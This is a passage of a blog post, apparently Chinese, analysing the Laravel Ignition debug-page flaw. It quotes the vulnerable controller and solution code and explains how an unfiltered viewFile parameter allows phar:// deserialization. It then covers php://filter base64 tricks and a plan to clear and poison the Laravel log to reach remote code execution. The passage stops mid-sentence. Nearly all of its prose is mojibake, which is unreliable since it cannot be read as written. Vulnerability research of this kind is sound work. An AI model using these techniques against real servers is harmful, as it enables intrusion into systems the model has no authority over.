/><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† blade æ¨¡æ¿ã€‚</p><p>Ignition æå‡ºçš„è§£å†³æ–¹æ¡ˆä¾¿æ˜¯å°† <code>&#123;&#123; $name &#125;&#125;</code>  æ›¿æ¢ä¸º<code>&#123;&#123; $name ?? '' &#125;&#125;</code> ï¼Œè¿™é‡Œæˆ‘ä»¬ç‚¹å‡» <code>Make variable optional</code> å‰æŠ“åŒ…ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209003639494.png" alt="image-20210209003639494" style="zoom:80%;" /><p>post ä¼ é€’äº†ç›¸åº”çš„è§£å†³æ–¹æ¡ˆç±»ã€è¦æ›¿æ¢çš„å˜é‡åä»¥åŠå¯¹åº” View æ–‡ä»¶è·¯å¾„ã€‚</p><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>æ¥ä¸‹æ¥å®¡è®¡ä»£ç ï¼Œçœ‹ä¸Šè¿°ä¸‰ä¸ªå‚æ•°æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä» <code>src/IgnitionServiceProvider.php</code> ä¸­æŸ¥æ‰¾å¯¹åº”è·¯ç”±æ˜ å°„çš„æ§åˆ¶å™¨ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210162017025.png" alt="image-20210210162017025" style="zoom:80%;" /><p><code>src/Http/Controllers/ExecuteSolutionController.php</code> è¿™æ˜¯åªæœ‰å•ä¸ªè¡Œä¸ºçš„æ§åˆ¶å™¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>solution</code> å†³å®šè§£å†³æ–¹æ¡ˆç±»åï¼š</p><p><code>src/SolutionProviders/SolutionProviderRepository.php</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSolutionForClass</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$solutionClass</span></span>): ?<span class="title">Solution</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! class_exists(<span class="variable">$solutionClass</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! in_array(Solution::class, class_implements(<span class="variable">$solutionClass</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app(<span class="variable">$solutionClass</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ç¡®ä¿äº†æˆ‘ä»¬æŒ‡å‘çš„ç±»å®ç° <code>RunnableSolution</code> è¿™ä¸ªæ¥å£ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ä¸èƒ½è¢«éšæ„æ›´æ”¹çš„ï¼Œpassã€‚</p><p>è€Œå¦å¤–çš„ <code>parameters</code> åˆ™ä¼šè¢«ä¼ åˆ°å„ä¸ªæ–¹æ¡ˆç±»ä¸­ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210170354826.png" alt="image-20210210170354826" style="zoom:80%;" /><p>æˆ‘ä»¬å†æ¥çœ‹ <code>variableName</code> å’Œ <code>viewFile</code>ï¼š</p><p><code>src/Solutions/MakeViewVariableOptionalSolution.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="comment">// è¿™é‡Œå†™å…¥ä¿®æ”¹åçš„æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* æ³¨è§£ 1:</span></span><br><span class="line"><span class="comment">         * è¯»å– viewFile æ–‡ä»¶å†…å®¹ï¼Œç„¶ååˆ¤æ–­ variableName æ˜¯å¦è®¾ç½®å¹¶é NULL(isset)ï¼Œå†³å®šå¯¹æ–‡ä»¶çš„æ“ä½œ:</span></span><br><span class="line"><span class="comment">         * (1) å·²è®¾ç½®ï¼Œä»€ä¹ˆéƒ½ä¸åšã€‚</span></span><br><span class="line"><span class="comment">         * (2) æœªè®¾ç½®ï¼Œå°±å°† &#x27;$&#x27;.$parameters[&#x27;variableName&#x27;] æ›¿ç©º(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], </span><br><span class="line">                                   <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, </span><br><span class="line">                                   <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* æ³¨è§£ 2:</span></span><br><span class="line"><span class="comment">         * å¯¹åŸå§‹æ–‡ä»¶å†…å®¹å’Œä¿®æ”¹åçš„æ–‡ä»¶å†…å®¹å­—ç¬¦è¿›è¡Œäº†è§£æï¼Œç„¶åä½¿ç”¨ Zend å¼•æ“çš„è¯­æ³•åˆ†æå™¨è·å–æºç ä¸­çš„ PHP è¯­è¨€çš„è§£æå™¨ä»£å·</span></span><br><span class="line"><span class="comment">         * ç­‰ä»·äºåˆ†æä»£ç ç»“æ„</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* æ³¨è§£ 3:</span></span><br><span class="line"><span class="comment">         * è¿›è¡Œäº†ä¸€æ¬¡â€œæ­£ç¡®â€çš„ä»£ç ç»“æ„åˆ†æï¼Œå¦‚æœæˆ‘ä»¬å¯¹ variableName åŠ¨äº†äº›æ‰‹è„šï¼Œå®ƒå¯ä»¥é€šè¿‡ç»“æœå¯¹æ¯”é˜»æ­¢æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶</span></span><br><span class="line"><span class="comment">         * å½“ç„¶å¦‚æœæ¯”å¯¹æ­£ç¡®ï¼Œä¿®æ”¹åçš„æ–‡ä»¶å°†ä¼šè¢«å†™å…¥</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ­£å¸¸æƒ…å†µä¸‹çš„ token_get_all() æ‰§è¡Œç»“æœç”Ÿæˆ</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…åˆä»£ç çš„ä¸‰æ¡æ³¨è§£ç†è§£ï¼Œ<code>variableName</code> å…¶å®ç­‰åŒäºåŠ å¯†å£ä»¤ï¼Œæˆ‘ä»¬å¾ˆéš¾ç»•è¿‡è¿™ä¸ªéªŒè¯ã€‚</p><p>è€Œæœ€åä¸€ä¸ªå˜é‡ <code>viewFile</code> ï¼Œæœ‰è¯»å†™ä¸¤ä¸ªæ“ä½œï¼Œä¸”<strong>æ²¡æœ‰ä»»ä½•è¿‡æ»¤</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ <code>file_get_contents</code> é€šè¿‡ <code>phar://</code> ä¼ªåè®®è§£æ phar æ–‡ä»¶æ—¶ï¼Œä¼šå°† meta-data è¿›è¡Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬æˆ–è®¸å¯ä»¥åˆ©ç”¨å®ƒæ¥ RCE ã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä»ä¸¤ä¸ªé—®é¢˜å‡ºå‘ï¼Œåˆ†æå¦‚ä½•å»åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><h4 id="å†™å…¥ä»€ä¹ˆæ ·çš„æ–‡ä»¶ï¼Ÿ"><a href="#å†™å…¥ä»€ä¹ˆæ ·çš„æ–‡ä»¶ï¼Ÿ" class="headerlink" title="å†™å…¥ä»€ä¹ˆæ ·çš„æ–‡ä»¶ï¼Ÿ"></a>å†™å…¥ä»€ä¹ˆæ ·çš„æ–‡ä»¶ï¼Ÿ</h4><p>ç°åœ¨ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¦æ‰¾åˆé€‚çš„æ–‡ä»¶å†™å…¥ï¼Œä¹‹å‰çš„æƒ…å†µæ˜¯ä½¿ç”¨äº†æœªçŸ¥å˜é‡ï¼Œä½†å› ä¸º <code>variableName</code>  ä¿®æ”¹æ–‡ä»¶å†…å®¹å‰æœ‰ä¸¥æ ¼éªŒè¯ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½åˆ©ç”¨å®ƒï¼Œä¹Ÿä¸èƒ½ä»é¡µé¢å¾—åˆ°ä»»ä½•æœ‰æ•ˆä¿¡æ¯ï¼Œå·²å­˜åœ¨çš„æ–‡ä»¶åŒç†ã€‚</p><p>é‚£ä¹ˆï¼Œæœ€åçš„é€‰é¡¹ä¾¿æ˜¯æ—¥å¿—æ–‡ä»¶äº†ã€‚</p><p>Laravel ä½¿ç”¨ <a href="https://github.com/Seldaek/monolog">Monolog</a> åº“ä¸ºå„ç§å¼ºå¤§çš„æ—¥å¿—å¤„ç†ç¨‹åºæä¾›æ”¯æŒï¼Œ<code>config/app.php</code> é…ç½®æ–‡ä»¶çš„ <code>debug</code> é€‰é¡¹å†³å®šäº†æ˜¯å¦å‘ç”¨æˆ·æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤é€‰é¡¹è®¾ç½®ä¸ºè·å–å­˜å‚¨åœ¨ <code>.env</code> æ–‡ä»¶ä¸­çš„ <code>APP_DEBUG</code> ç¯å¢ƒå˜é‡çš„å€¼ï¼Œé»˜è®¤çš„ Laravel æ—¥å¿—è®°å½•åœ¨ä¸€ä¸ªæ–‡ä»¶ <code>storage/logs/laravel.log</code> ã€‚</p><p>æˆ‘ä»¬å¤ç°çš„ç¯å¢ƒæœ¬æ¥å°±æ˜¯å¤„äº Debug æ¨¡å¼ä¸‹ï¼Œæœ¬æ¥å¯¹äºæœ¬åœ°å¼€å‘ï¼Œåº”è¯¥å°† <code>APP_DEBUG</code> ç¯å¢ƒå˜é‡è®¾ç½®ä¸º true ã€‚è€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ­¤å€¼åº”å§‹ç»ˆä¿æŒ false ã€‚å¦‚æœåœ¨ç”Ÿäº§ä¸­å°†è¯¥å€¼è®¾ç½®ä¸º true ï¼Œåˆ™æœ‰å¯èƒ½ä¼šå°†æ•æ„Ÿçš„é…ç½®ä¿¡æ¯æš´éœ²ç»™åº”ç”¨ç¨‹åºçš„æœ€ç»ˆç”¨æˆ·ï¼Œè¿™ä¹Ÿæ˜¯è¯¥æ¼æ´çš„ä¸€å¤§æˆå› ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æ¥å°è¯•åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„ View æ–‡ä»¶ï¼š</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210231146374.png" alt="image-20210210231146374"></p><p>å†æ¥çœ‹å®ä¾‹çš„ log æ–‡ä»¶æ˜¯å¦æœ‰å¯¹åº”è®°å½•ï¼š</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210231409402.png" alt="image-20210210231409402"></p><p>æˆåŠŸäº†ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥ç²¾å¿ƒæ„é€ çš„ payload é€šè¿‡æ—¥å¿—æ–‡ä»¶è·å–æƒ³è¦çš„ä¿¡æ¯ã€‚</p><h4 id="å¦‚ä½•è½¬æ¢æ–‡ä»¶ï¼Ÿ"><a href="#å¦‚ä½•è½¬æ¢æ–‡ä»¶ï¼Ÿ" class="headerlink" title="å¦‚ä½•è½¬æ¢æ–‡ä»¶ï¼Ÿ"></a>å¦‚ä½•è½¬æ¢æ–‡ä»¶ï¼Ÿ</h4><p>è™½èƒ½å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œè¿˜æ˜¯æœ‰å‡ ä¸ªé—®é¢˜éœ€è¦æ³¨æ„ï¼š</p><ol><li><p>æˆ‘ä»¬å†™å…¥äº†æ—¥å¿—æ–‡ä»¶åï¼Œè¦æ€ä¹ˆè®©å…¶ä½œä¸º php æ–‡ä»¶è§£æï¼Ÿ</p><p>åç¼€åæ˜¯ä¸èƒ½å˜çš„ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶æƒ³åˆ°äº† phar æ¥ä¼ªé€ ã€‚</p><p>phar æ–‡ä»¶åªè¦æœ‰æ­£ç¡®çš„ stub å³å¯ï¼Œå®ƒå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥ <code>__HALT_COMPILER();?&gt;</code> æ¥ç»“å°¾ï¼Œå¦åˆ™ phar æ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸º phar æ–‡ä»¶ã€‚</p></li><li><p>æˆ‘ä»¬å¦‚ä½•è½¬æ¢ log æ–‡ä»¶ä¸º phar ï¼Ÿ</p><p>ç”¨ <code>php://filter</code>  åœ¨æ–‡ä»¶è¿”å›å‰æ›´æ”¹å…¶å†…å®¹ï¼Ÿ</p><p>CTFer åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼Œåœ¨è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„ php ç­‰æºæ–‡ä»¶æ—¶ï¼Œä¸ºäº†è§„é¿ç‰¹æ®Šå­—ç¬¦é€ æˆæ··ä¹±ï¼Œå…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„ä»£ç â€ç¼–ç ä¸€éï¼Œå¦‚ b64 ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><p>è€Œ php åœ¨è¿›è¡Œ b64 è§£ç æ—¶ï¼Œ<strong>ä¸ç¬¦åˆ b64 æ ‡å‡†çš„å­—ç¬¦å°†è¢«å¿½ç•¥</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ä»…å°†åˆæ³•å­—ç¬¦ç»„æˆå¯†æ–‡è¿›è¡Œè§£ç ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨ç»•è¿‡â€œæ­»äº¡ exitâ€æ—¶ç»å¸¸è¢«ç”¨åˆ°ï¼Œè§£å¯†ç­‰åŒäºä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ï¼Œä½†æ—¥å¿—æ–‡ä»¶å¹¶éå®Œå…¨ç”±æˆ‘ä»¬å†™å…¥çš„å†…å®¹ç»„æˆï¼Œè¿˜æœ‰æ—§è®°å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬æ³¨å…¥ç”Ÿæˆçš„è®°å½•ä¼šç±»äºä»¥ä¸‹æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[2021-02-10 14:35:38] local.ERROR: file_get_contents(snovving): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(snovving): failed to open stream: No such file or directory at /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)</span><br><span class="line">[stacktrace]</span><br><span class="line">#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#x27;file_get_conten...&#x27;, &#x27;/src/vendor/fac...&#x27;, 75, Array)</span><br><span class="line">#1 /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents(&#x27;snovving&#x27;)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#36 /src/server.php(21): require_once(&#x27;/src/public/ind...&#x27;)</span><br><span class="line">#37 &#123;main&#125;</span><br><span class="line">&quot;&#125; </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° payload (snovving) å‡ºç°äº†ä¸‰æ¬¡ï¼Œè¿˜æœ‰æ—¶é—´å‰ç¼€å’Œåé¢å¤§é‡å †æ ˆè·Ÿè¸ªçš„ä¿¡æ¯ï¼Œæ³¨å…¥çš„å†…å®¹åªå å…¶ä¸­å¾ˆå°ä¸€éƒ¨åˆ†ï¼Œè¿™æ„å‘³ç€è¿”å›çš„å†…å®¹å°†æ˜¯å·¨é‡çš„ã€‚</p><p>åŒæ—¶è¿˜æœ‰ä¸ªéå¸¸ä¸¥é‡çš„é—®é¢˜ï¼Œb64 è§£ç æ˜¯ 4 æ¯”ç‰¹ä¸€ç»„ï¼Œ<code>==</code> æˆ– <code>=</code> åªä¼šå‡ºç°åœ¨æœ«å°¾ï¼Œå®ƒä»¬ä»£è¡¨æœ€åä¸€ç»„çš„ä»£ç åªæœ‰ 8 ä½æˆ– 16 ä½ï¼Œå¦‚æœ <code>=</code> å‡ºç°åœ¨äº†ä¸­é—´ï¼Œå› ä¸ºæ˜¯ b64 åˆæ³•å­—ç¬¦ä¸ä¼šè¢«å¿½ç•¥ï¼Œä¹Ÿç»å¤§å¯èƒ½ä¸èƒ½è¢«æ­£ç¡®è§£ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œphp å°†ä¼šæŠ¥é”™ï¼Œ<strong>è¿™æ ·å°†ä¸ä¼šè¿”å›ä»»ä½•ç»“æœ</strong>ã€‚</p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå³ä½¿æˆ‘ä»¬åˆ©ç”¨å¤šæ¬¡ b64 è§£ç åƒæ‰å…¶ä»–å­—ç¬¦ï¼Œä¹Ÿå¾ˆå¤§å¯èƒ½å‡ºç°é”™è¯¯ï¼ˆ<code>=</code>ï¼‰ï¼Œå¹¶ä¸èƒ½ç²¾ç¡®åœ°è½¬æ¢ä¸º phar ï¼Œè€Œä¸”æ„é€ ä¸Šä¹Ÿå¾ˆç¹çï¼Œå› ä¸ºæˆ‘ä»¬åœ¨å®é™…æµ‹è¯•ä¸­ï¼Œå¹¶ä¸çŸ¥é“æ—§è®°å½•ï¼Œä¹Ÿä¸çŸ¥é“ <code>log_max_files</code> æœ€å¤§çš„æ—¥å¿—æ–‡ä»¶æ•°ã€‚</p><p><strong>æ€è€ƒåˆ°è¿™ï¼Œæ—¢ç„¶æ–‡æœ¬é‡å¤§ï¼Œåœ¨æ³¨å…¥å‰ï¼Œæˆ‘ä»¬ç´¢æ€§å½»åº•æ¸…ç©º log æ–‡ä»¶ï¼Œè¿™æ ·æ–‡ä»¶å†…å®¹å°±å®Œå…¨æ˜¯æˆ‘ä»¬ payload çš„è®°å½•äº†ï¼Œå±Šæ—¶å†æ¥æƒ³åŠæ³•ç”¨ b64 åƒå­—ç¬¦è½¬æ¢ï¼ŒåŒ–å¤§ä¸ºå°ã€‚</strong></p><p>ç¡®å®šæ€è·¯åï¼Œæˆ‘ä»¬å…ˆæ¥è§‚å¯Ÿå•ä¸ªé”™è¯¯è®°å½•ï¼Œ ä¹‹å‰æˆ‘ä»¬æ³¨æ„åˆ°å®ƒå‡ºç°äº†ä¸‰æ¬¡ï¼Œä½†æˆ‘ä»¬ç°åœ¨è¦å…³æ³¨çš„æ˜¯ payload <strong>å®Œæ•´</strong>å‡ºç°çš„åœ°æ–¹ï¼š</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210211040549489.png" alt="image-20210211040549489"></p><p>è¿™é‡Œæˆ‘ç”¨äº†æ›´æ˜æ˜¾çš„ payload ï¼Œå¯ä»¥çœ‹åˆ°å®Œæ•´å‡ºç°çš„æœ‰ä¸¤å¤„ï¼Œè®°å½•ç»“æ„ä¹Ÿå°±ç›¸å½“äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x1]payload[x2]payload[x3]</span><br></pre></td></tr></table></figure><p>å³ä½¿åŠ ä¸Šä»¥å‰æ—¥å¿—è®°å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x0]</span><br><span class="line">[x1]payload[x2]payload[x3]</span><br></pre></td></tr></table></figure><p>è¿™èˆ¬ï¼Œæˆ‘ä»¬æ¸…ç©º log ï¼Œä¹Ÿå°±åˆ é™¤äº† <code>[x0]</code> ã€‚</p><p><strong>æ¸…ç©º log 